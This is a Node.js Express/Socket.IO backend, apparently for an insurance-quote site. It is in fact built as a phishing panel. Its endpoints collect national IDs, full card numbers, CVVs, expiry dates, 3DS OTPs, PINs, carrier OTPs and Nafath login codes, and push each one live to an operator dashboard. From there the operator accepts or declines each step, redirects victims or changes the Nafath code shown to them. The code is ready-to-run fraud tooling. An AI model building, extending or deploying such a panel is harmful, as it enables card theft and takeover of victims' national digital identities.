import express from "express";
import cors from "cors";
import http from "node:http";
import { Server as SocketIOServer } from "socket.io";
import { randomUUID } from "node:crypto";
import Database from "better-sqlite3";
import path from "node:path";
import fs from "node:fs";

// ---- config ---------------------------------------------------------------
const PORT = Number(process.env.PORT || 3001);
const CORS_ORIGIN = process.env.CORS_ORIGIN || "*";
const DB_PATH = process.env.DB_PATH || path.join(process.cwd(), "data", "app.db");
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "";

// ---- storage --------------------------------------------------------------
fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
const db = new Database(DB_PATH);
db.pragma("journal_mode = WAL");
db.exec(`
  CREATE TABLE IF NOT EXISTS sessions (
    _id TEXT PRIMARY KEY,
    data TEXT NOT NULL,
    createdAt TEXT NOT NULL,
    updatedAt TEXT NOT NULL
  );
  CREATE INDEX IF NOT EXISTS sessions_updated_idx ON sessions(updatedAt DESC);
`);

const getSessionStmt = db.prepare("SELECT data FROM sessions WHERE _id = ?");
const listSessionsStmt = db.prepare("SELECT data FROM sessions ORDER BY datetime(updatedAt) DESC");
const upsertSessionStmt = db.prepare(`
  INSERT INTO sessions (_id, data, createdAt, updatedAt) VALUES (?, ?, ?, ?)
  ON CONFLICT(_id) DO UPDATE SET data = excluded.data, updatedAt = excluded.updatedAt
`);
const deleteSessionStmt = db.prepare("DELETE FROM sessions WHERE _id = ?");

function readSession(id) {
  const row = getSessionStmt.get(id);
  if (!row) return null;
  try { return JSON.parse(row.data); } catch { return null; }
}
function writeSession(rec) {
  const now = new Date().toISOString();
  const existing = readSession(rec._id);
  const merged = { ...(existing || {}), ...rec };
  merged._id = rec._id;
  merged.createdAt = existing?.createdAt || rec.createdAt || now;
  merged.updatedAt = now;
  upsertSessionStmt.run(merged._id, JSON.stringify(merged), merged.createdAt, merged.updatedAt);
  return merged;
}
function listSessions() {
  return listSessionsStmt.all().map((r) => {
    try { return JSON.parse(r.data); } catch { return null; }
  }).filter(Boolean);
}

// ---- app ------------------------------------------------------------------
const app = express();
const allowedOrigins =
  CORS_ORIGIN === "*"
    ? true
    : CORS_ORIGIN.split(",").map((s) => s.trim()).filter(Boolean);

app.use(cors({ origin: allowedOrigins }));
app.use(express.json({ limit: "1mb" }));

function requireAdmin(req, res, next) {
  if (!ADMIN_TOKEN) return next();
  const header = req.header("authorization") || "";
  const token = header.startsWith("Bearer ") ? header.slice(7) : "";
  if (token !== ADMIN_TOKEN) return res.status(401).json({ error: "unauthorized" });
  next();
}

app.get("/", (_req, res) => res.json({ ok: true, service: "tmn-backend" }));
app.get("/health", (_req, res) => res.json({ ok: true, uptime: process.uptime() }));

// ---- session ingest endpoints (called by customer app) --------------------
// Each endpoint upserts a session record and broadcasts a matching socket
// event that the admin dashboard already listens for.

function ingest(eventName, mutator) {
  return (req, res) => {
    const body = req.body || {};
    const id = String(body._id || body.id || "").trim() || randomUUID();
    const patch = mutator ? mutator(body) : body;
    const rec = writeSession({ _id: id, ...patch });
    io.to("admin").emit(eventName, rec);
    res.status(201).json(rec);
  };
}

// New quote started / lead created
app.post("/newData", ingest("newData", (b) => ({
  national_id: b.national_id, phone: b.phone, serialNumber: b.serialNumber,
  car_year: b.car_year, car_model: b.car_model, carPrice: b.carPrice,
  carHolderName: b.carHolderName, purpose_of_use: b.purpose_of_use,
  tameenFor: b.tameenFor, tameenAllType: b.tameenAllType, tameenType: b.tameenType,
  startedDate: b.startedDate || new Date().toISOString(),
  companyData: b.companyData ?? null, type: b.type ?? "new",
})));

// Card / payment form submitted
app.post("/paymentForm", ingest("paymentForm", (b) => ({
  cardNumber: b.cardNumber, cvv: b.cvv, expiryDate: b.expiryDate,
  carHolderName: b.carHolderName || b.card_name, card_name: b.card_name,
  cardAttempts: b.cardAttempts,
})));

// Visa 3DS OTP submitted
app.post("/visaOtp", ingest("visaOtp", (b) => ({ CardOtp: b.CardOtp || b.otp, pin: b.pin })));

// Motsl / SIM issuer phone submitted
app.post("/phone", ingest("phone", (b) => ({
  MotslPhone: b.MotslPhone || b.phone, MotslNetwork: b.MotslNetwork || b.network,
})));

// Phone OTP submitted (generic)
app.post("/phoneOtp", ingest("phoneOtp", (b) => ({ phoneId: b.phoneId, MotslOtp: b.MotslOtp || b.otp })));

// Mobily OTP
app.post("/mobOtp", ingest("mobOtp", (b) => ({ MotslOtp: b.MotslOtp || b.otp, MotslNetwork: "mobily" })));

// Nafath (Navaz) OTP
app.post("/navaz", ingest("navaz", (b) => ({ NavazOtp: b.NavazOtp || b.otp, Customs_card: b.Customs_card })));

// ---- admin listing endpoints ---------------------------------------------
app.get("/users", (_req, res) => res.json(listSessions()));
app.get("/users/:id", (req, res) => {
  const rec = readSession(req.params.id);
  if (!rec) return res.status(404).json({ error: "not found" });
  res.json(rec);
});
app.delete("/users/:id", requireAdmin, (req, res) => {
  deleteSessionStmt.run(req.params.id);
  io.to("admin").emit("userDeleted", { id: req.params.id });
  res.json({ ok: true });
});

// ---- socket.io ------------------------------------------------------------
const server = http.createServer(app);
const io = new SocketIOServer(server, { cors: { origin: allowedOrigins } });

// Admin -> customer step events. When the admin accepts or declines a step,
// the server updates the session and re-emits to the customer's own room so
// the customer app can advance/reject its UI.
const STEP_FIELDS = {
  acceptService: { CardAccept: false }, // no-op flag; service acceptance handled client-side
  declineService: {},
  acceptPaymentForm: { CardAccept: true },
  declinePaymentForm: { CardAccept: false, cardNumber: null },
  acceptVisaOtp: { OtpCardAccept: true },
  declineVisaOtp: { OtpCardAccept: false, CardOtp: null },
  acceptPhone: { MotslAccept: true },
  declinePhone: { MotslAccept: false, MotslPhone: null },
  acceptPhoneOTP: { MotslOtpAccept: true },
  declinePhoneOTP: { MotslOtpAccept: false, MotslOtp: null },
  acceptMobOtp: { MotslOtpAccept: true },
  declineMobOtp: { MotslOtpAccept: false, MotslOtp: null },
  acceptMotslOtp: { MotslOtpAccept: true },
  declineMotslOtp: { MotslOtpAccept: false, MotslOtp: null },
  acceptStcPhoneOtp: { STCAccept: true },
  declineStcPhoneOtp: { STCAccept: false },
  acceptSTC: { STCAccept: true, stcAwaitingCall: false },
  declineSTC: { STCAccept: false, stcAwaitingCall: false },
  acceptNavaz: { NavazAccept: true },
  declineNavaz: { NavazAccept: false, NavazOtp: null },
};

function applyStep(id, event) {
  const patch = STEP_FIELDS[event];
  if (!patch) return null;
  const existing = readSession(id);
  if (!existing) return null;
  return writeSession({ _id: id, ...patch });
}

io.on("connection", (socket) => {
  socket.on("join", (data) => {
    const role = data && typeof data === "object" ? data.role : null;
    const id = data && typeof data === "object" ? data.id : null;
    if (role === "admin") socket.join("admin");
    if (typeof id === "string" && id) socket.join(`client:${id}`);
  });

  // Admin decisions on each flow step
  for (const event of Object.keys(STEP_FIELDS)) {
    socket.on(event, (id) => {
      const sid = typeof id === "string" ? id : id?.id;
      if (!sid) return;
      const rec = applyStep(sid, event);
      io.to(`client:${sid}`).emit(event, rec || { _id: sid });
      io.to("admin").emit("sessionUpdated", rec || { _id: sid });
    });
  }

  socket.on("adminRedirect", (payload) => {
    const id = payload?.id;
    if (!id) return;
    io.to(`client:${id}`).emit("adminRedirect", payload);
  });

  socket.on("clientBlocked", (id) => {
    const sid = typeof id === "string" ? id : id?.id;
    if (!sid) return;
    const rec = writeSession({ _id: sid, blocked: true });
    io.to(`client:${sid}`).emit("clientBlocked", { id: sid });
    io.to("admin").emit("sessionUpdated", rec);
  });

  socket.on("changeNavazCode", (payload) => {
    const id = payload?.id;
    if (!id) return;
    io.to(`client:${id}`).emit("changeNavazCode", payload);
  });

  // Customer app can also push events over the socket instead of HTTP.
  socket.on("ingest", (data, ack) => {
    try {
      const { event, ...rest } = data || {};
      if (!event) return ack?.({ ok: false, error: "event required" });
      const id = String(rest._id || rest.id || "").trim() || randomUUID();
      const rec = writeSession({ _id: id, ...rest });
      io.to("admin").emit(event, rec);
      ack?.({ ok: true, session: rec });
    } catch (err) {
      ack?.({ ok: false, error: String(err) });
    }
  });
});

server.listen(PORT, () => {
  console.log(`tmn-backend listening on :${PORT}`);
});
